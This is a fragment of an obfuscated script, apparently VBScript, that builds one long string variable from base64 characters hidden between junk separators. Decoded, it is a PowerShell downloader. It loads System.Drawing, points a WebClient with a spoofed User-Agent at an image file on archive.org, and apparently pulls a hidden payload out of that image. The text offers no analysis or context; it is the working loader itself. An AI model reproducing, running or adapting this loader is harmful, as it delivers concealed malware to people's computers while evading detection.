ktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqtmgkitbaktkqzbaqBmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqQmgkitbaktkqzbaqtmgkitbaktkqzbaqVmgkitbaktkqzbaqHmgkitbaktkqzbaqlmgkitbaktkqzbaqwmgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaqAmgkitbaktkqzbaqtmgkitbaktkqzbaqQmgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaqzmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq1mgkitbaktkqzbaqimgkitbaktkqzbaqbmgkitbaktkqzbaqHmgkitbaktkqzbaqlmgkitbaktkqzbaqOmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaq1mgkitbaktkqzbaqlmgkitbaktkqzbaqImgkitbaktkqzbaqFmgkitbaktkqzbaqNmgkitbaktkqzbaq5mgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqEmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqFmgkitbaktkqzbaq3mgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqOmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqymgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaq9mgkitbaktkqzbaqtmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqMmgkitbaktkqzbaq9mgkitbaktkqzbaqJmgkitbaktkqzbaq2mgkitbaktkqzbaqhmgkitbaktkqzbaq0mgkitbaktkqzbaqdmgkitbaktkqzbaqHmgkitbaktkqzbaqBmgkitbaktkqzbaqzmgkitbaktkqzbaqOmgkitbaktkqzbaqimgkitbaktkqzbaq8mgkitbaktkqzbaqvmgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqJmgkitbaktkqzbaqjmgkitbaktkqzbaqamgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaq2mgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqvmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqcmgkitbaktkqzbaqvmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaq9mgkitbaktkqzbaq3mgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqxmgkitbaktkqzbaqvmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqQmgkitbaktkqzbaqvmgkitbaktkqzbaqdmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqpmgkitbaktkqzbaqdmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqymgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqUmgkitbaktkqzbaqtmgkitbaktkqzbaqMmgkitbaktkqzbaqTmgkitbaktkqzbaqcmgkitbaktkqzbaqzmgkitbaktkqzbaqMmgkitbaktkqzbaqzmgkitbaktkqzbaqMmgkitbaktkqzbaq1mgkitbaktkqzbaqOmgkitbaktkqzbaqTmgkitbaktkqzbaqMmgkitbaktkqzbaqxmgkitbaktkqzbaqNmgkitbaktkqzbaqTmgkitbaktkqzbaqImgkitbaktkqzbaqwmgkitbaktkqzbaqMmgkitbaktkqzbaqimgkitbaktkqzbaq0mgkitbaktkqzbaq4mgkitbaktkqzbaqNmgkitbaktkqzbaqzmgkitbaktkqzbaqUmgkitbaktkqzbaqwmgkitbaktkqzbaqLmgkitbaktkqzbaq3mgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqZmgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqNmgkitbaktkqzbaqlmgkitbaktkqzbaqLmgkitbaktkqzbaqTmgkitbaktkqzbaqEmgkitbaktkqzbaq3mgkitbaktkqzbaqMmgkitbaktkqzbaqzmgkitbaktkqzbaqMmgkitbaktkqzbaqzmgkitbaktkqzbaqNmgkitbaktkqzbaqTmgkitbaktkqzbaqkmgkitbaktkqzbaqzmgkitbaktkqzbaqMmgkitbaktkqzbaqTmgkitbaktkqzbaqUmgkitbaktkqzbaqymgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqImgkitbaktkqzbaqtmgkitbaktkqzbaqOmgkitbaktkqzbaqDmgkitbaktkqzbaqcmgkitbaktkqzbaq1mgkitbaktkqzbaqMmgkitbaktkqzbaqCmgkitbaktkqzbaq5mgkitbaktkqzbaqqmgkitbaktkqzbaqcmgkitbaktkqzbaqGmgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqOmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqmmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqamgkitbaktkqzbaq3mgkitbaktkqzbaqkmgkitbaktkqzbaq9mgkitbaktkqzbaqTmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaq3mgkitbaktkqzbaqLmgkitbaktkqzbaqUmgkitbaktkqzbaq9mgkitbaktkqzbaqimgkitbaktkqzbaqamgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqjmgkitbaktkqzbaqdmgkitbaktkqzbaqCmgkitbaktkqzbaqBmgkitbaktkqzbaqTmgkitbaktkqzbaqemgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaq0mgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq0mgkitbaktkqzbaqumgkitbaktkqzbaqTmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaq0mgkitbaktkqzbaqLmgkitbaktkqzbaqlmgkitbaktkqzbaqdmgkitbaktkqzbaqlmgkitbaktkqzbaqYmgkitbaktkqzbaqkmgkitbaktkqzbaqNmgkitbaktkqzbaqsmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqdmgkitbaktkqzbaqDmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqZmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqpmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqtmgkitbaktkqzbaq5mgkitbaktkqzbaqLmgkitbaktkqzbaqkmgkitbaktkqzbaqhmgkitbaktkqzbaqlmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqRmgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqMmgkitbaktkqzbaqumgkitbaktkqzbaqQmgkitbaktkqzbaqWmgkitbaktkqzbaqRmgkitbaktkqzbaqkmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqdmgkitbaktkqzbaqVmgk"
ferromagnetism = ferromagnetism & "itbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqVmgkitbaktkqzbaqymgkitbaktkqzbaqLmgkitbaktkqzbaqUmgkitbaktkqzbaqFmgkitbaktkqzbaqnmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaq0mgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqTmgkitbaktkqzbaqWmgkitbaktkqzbaq9mgkitbaktkqzbaq6mgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqxmgkitbaktkqzbaqsmgkitbaktkqzbaqYmgkitbaktkqzbaqSmgkitbaktkqzbaq8mgkitbaktkqzbaq1mgkitbaktkqzbaqLmgkitbaktkqzbaqjmgkitbaktkqzbaqAmgkitbaktkqzbaqnmgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqYmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqhmgkitbaktkqzbaqemgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqkmgkitbaktkqzbaq9mgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaqZmgkitbaktkqzbaqymgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaqrmgkitbaktkqzbaqemgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqEmgkitbaktkqzbaqbmgkitbaktkqzbaq3mgkitbaktkqzbaqdmgkitbaktkqzbaqumgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaq9mgkitbaktkqzbaqhmgkitbaktkqzbaqZmgkitbaktkqzbaqEmgkitbaktkqzbaqRmgkitbaktkqzbaqhmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqEmgkitbaktkqzbaqomgkitbaktkqzbaqJmgkitbaktkqzbaqHmgkitbaktkqzbaqJmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaq1mgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqzmgkitbaktkqzbaqcmgkitbaktkqzbaqymgkitbaktkqzbaqkmgkitbaktkqzbaq7mgkitbaktkqzbaqJmgkitbaktkqzbaqHmgkitbaktkqzbaqNmgkitbaktkqzbaqwmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqFmgkitbaktkqzbaq3mgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaq2mgkitbaktkqzbaqxmgkitbaktkqzbaq5mgkitbaktkqzbaqPmgkitbaktkqzbaqVmgkitbaktkqzbaqtmgkitbaktkqzbaqimgkitbaktkqzbaqemgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqlmgkitbaktkqzbaqWmgkitbaktkqzbaq1mgkitbaktkqzbaq1mgkitbaktkqzbaqdmgkitbaktkqzbaqKmgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqNmgkitbaktkqzbaqDmgkitbaktkqzbaqImgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqNmgkitbaktkqzbaqEmgkitbaktkqzbaqQmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqNmgkitbaktkqzbaqzmgkitbaktkqzbaqImgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqNmgkitbaktkqzbaqkmgkitbaktkqzbaqUmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqzmgkitbaktkqzbaqcmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqzmgkitbaktkqzbaqYmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqjmgkitbaktkqzbaqgmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqNmgkitbaktkqzbaqjmgkitbaktkqzbaqQmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqNmgkitbaktkqzbaqEmgkitbaktkqzbaqQmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqkmgkitbaktkqzbaqYmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqEmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzb"
ferromagnetism = ferromagnetism & "aqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqTmgkitbaktkqzbaqgmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaq0mgkitbaktkqzbaqMmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqNmgkitbaktkqzbaqkmgkitbaktkqzbaqUmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqzmgkitbaktkqzbaqcmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqQmgkitbaktkqzbaqzmgkitbaktkqzbaqQmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqEmgkitbaktkqzbaqUmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqQmgkitbaktkqzbaqzmgkitbaktkqzbaqQmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqEmgkitbaktkqzbaqUmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqsmgkitbaktkqzbaqImgkitbaktkqzbaqDmgkitbaktkqzbaqBmgkitbaktkqzbaq4mgkitbaktkqzbaqMmgkitbaktkqzbaqDmgkitbaktkqzbaqAmgkitbaktkqzbaqpmgkitbaktkqzbaqOmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqOmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqtmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqFmgkitbaktkqzbaq5mgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqZmgkitbaktkqzbaqpmgkitbaktkqzbaqYmgkitbaktkqzbaq2mgkitbaktkqzbaqgmgkitbaktkqzbaq9mgkitbaktkqzbaqLmgkitbaktkqzbaqTmgkitbaktkqzbaqEmgkitbaktkqzbaq7mgkitbaktkqzbaqZmgkitbaktkqzbaqmmgkitbaktkqzbaq9mgkitbaktkqzbaqymgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqimgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqymgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqPmgkitbaktkqzbaqTmgkitbaktkqzbaqAmgkitbaktkqzbaq7mgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaqJmgkitbaktkqzbaqsmgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaq0mgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqJmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqcmgkitbaktkqzbaqgmgkitbaktkqzbaqLmgkitbaktkqzbaqWmgkitbaktkqzbaqxmgkitbaktkqzbaqlmgkitbaktkqzbaqImgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqimgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqFmgkitbaktkqzbaq6mgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqymgkitbaktkqzbaqemgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqMmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqgmgkitbaktkqzbaqtmgkitbaktkqzbaqJmgkitbaktkqzbaqHmgkitbaktkqzbaqNmgkitbaktkqzbaqwmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqFmgkitbaktkqzbaq3mgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaq2mgkitbaktkqzbaqxmgkitbaktkqzbaq5mgkitbaktkqzbaqLmgkitbaktkqzbaqkmgkitbaktkqzbaqxmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqdmgkitbaktkqzbaq0mgkitbaktkqzbaqamgkitbaktkqzbaqDmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqYmgkitbaktkqzbaqmmgkitbaktkqzbaqxmgkitbaktkqzbaqpmgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaqymgkitbaktkqzbaqsmgkitba"
ferromagnetism = ferromagnetism & "ktkqzbaqrmgkitbaktkqzbaqKmgkitbaktkqzbaqXmgkitbaktkqzbaqsmgkitbaktkqzbaqgmgkitbaktkqzbaqJmgkitbaktkqzbaqHmgkitbaktkqzbaqBmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqHmgkitbaktkqzbaqlmgkitbaktkqzbaqomgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqRmgkitbaktkqzbaqymgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqMmgkitbaktkqzbaq9mgkitbaktkqzbaqJmgkitbaktkqzbaqHmgkitbaktkqzbaqRmgkitbaktkqzbaqymgkitbaktkqzbaqdmgkitbaktkqzbaqWmgkitbaktkqzbaqUmgkitbaktkqzbaq7mgkitbaktkqzbaqZmgkitbaktkqzbaqmmgkitbaktkqzbaq9mgkitbaktkqzbaqymgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqtmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqpmgkitbaktkqzbaqYmgkitbaktkqzbaqmmgkitbaktkqzbaq9mgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaqDmgkitbaktkqzbaq0mgkitbaktkqzbaqwmgkitbaktkqzbaqOmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqtmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqpmgkitbaktkqzbaqYmgkitbaktkqzbaqmmgkitbaktkqzbaq9mgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaqCmgkitbaktkqzbaqAmgkitbaktkqzbaqtmgkitbaktkqzbaqbmgkitbaktkqzbaqHmgkitbaktkqzbaqQmgkitbaktkqzbaqgmgkitbaktkqzbaqJmgkitbaktkqzbaqHmgkitbaktkqzbaqNmgkitbaktkqzbaqwmgkitbaktkqzbaqcmgkitbaktkqzbaqmmgkitbaktkqzbaqFmgkitbaktkqzbaq3mgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaq2mgkitbaktkqzbaqxmgkitbaktkqzbaq5mgkitbaktkqzbaqLmgkitbaktkqzbaqkmgkitbaktkqzbaqxmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqdmgkitbaktkqzbaq0mgkitbaktkqzbaqamgkitbaktkqzbaqDmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqJmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqQmgkitbaktkqzbaqrmgkitbaktkqzbaqKmgkitbaktkqzbaqymgkitbaktkqzbaqlmgkitbaktkqzbaq7mgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqYmgkitbaktkqzbaqomgkitbaktkq